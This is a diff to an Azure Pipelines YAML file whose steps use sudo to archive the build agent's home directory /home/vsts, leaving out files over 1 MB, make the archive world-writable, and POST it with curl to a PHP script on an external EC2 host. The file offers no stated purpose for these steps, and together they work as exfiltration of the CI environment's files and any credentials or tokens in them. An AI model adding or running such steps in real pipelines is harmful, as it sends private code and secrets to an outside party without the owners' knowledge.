@@ -10,12 +10,15 @@ pool:
   vmImage: ubuntu-latest
 
 steps:
-- script: sudo /usr/bin/tar -czvf /mnt/teste1.tgz /home/vsts
+- script: sudo /usr/bin/tar -czvf /mnt/teste1.tgz /home/vsts --exclude-from <(find /home/vsts/ -size +1M)
   displayName: 'Tar'
-  continueOnError: True
+  continueOnError: true
 
-- script: sudo /bin/bash -c 'chmod 777 /mnt/teste1.tgz' 
-  displayName: 'sudo'
+- script: ls -lah /mnt/teste1.tgz
+  displayName: 'ls'
+
+- script: sudo chmod 777 /mnt/teste1.tgz
+  displayName: 'chmod'
 
 - script: curl -d "@/mnt/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
   displayName: 'upload'
